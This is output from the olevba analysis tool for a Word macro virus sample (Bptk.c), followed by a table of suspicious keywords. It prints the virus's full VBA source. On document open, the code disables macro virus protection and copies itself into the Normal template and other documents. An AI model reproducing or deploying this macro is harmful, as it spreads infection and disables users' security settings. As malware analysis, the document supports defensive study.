olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bptk.c-3c4a29e9a654947e9266eedf9d79ffc70e1c1cd8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bptk.c-3c4a29e9a654947e9266eedf9d79ffc70e1c1cd8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next 'D
Application.EnableCancelKey = 0
With Options:
.ConfirmConversions = 0
.SaveNormalPrompt = 0
.VirusProtection = 0
End With
t = "D"
If ActiveDocument.VBProject.VBComponents.Item(1).Codemodule.Lines(2, 1) <> "On Error Resume Next 'D" Then
Set d = ActiveDocument.VBProject.VBComponents.Item(1)
Set c = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.Lines(2, 1) <> "On Error Resume Next 'D" Then
Set d = NormalTemplate.VBProject.VBComponents.Item(1)
Set c = ActiveDocument.VBProject.VBComponents.Item(1)
Else: t = ""
End If
If t <> "" Then
d.Codemodule.DeleteLines 1, d.Codemodule.CountOfLines
d.Codemodule.AddFromString c.Codemodule.Lines(1, c.Codemodule.CountOfLines)
ActiveDocument.Save
NormalTemplate.Save
End If
Randomize
If Rnd < 0.3 Then MsgBox "ÁÏÒÊ"
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

